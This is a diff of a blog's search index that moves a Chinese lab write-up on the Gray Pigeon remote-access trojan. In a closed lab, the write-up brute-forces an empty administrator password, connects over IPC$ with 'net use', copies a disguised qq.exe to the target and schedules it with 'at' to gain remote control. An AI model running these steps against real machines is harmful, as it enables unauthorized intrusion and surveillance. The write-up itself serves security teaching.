+<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
+<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p>
+<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>
 ]]></content>
       <categories>
-        <category>ctf</category>
+        <category>木马</category>
       </categories>
-      <tags>
-        <tag>unserialize</tag>
-        <tag>ssti</tag>
-        <tag>文件上传</tag>
-      </tags>
   </entry>
   <entry>
     <title>爬图</title>
@@ -5401,26 +5657,6 @@ urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图
       <tags>
         <tag>爬虫</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>木马</title>
-    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
-<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
-<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
-<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p>
-<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
-<p>获取账号密码<br>username：administrator<br>password: “”</p>
-<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
-<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
-<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
-<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
-<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p>
-<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>
-]]></content>
-      <categories>
-        <category>木马</category>
-      </categories>
   </entry>
   <entry>
     <title>算法上机复习</title>
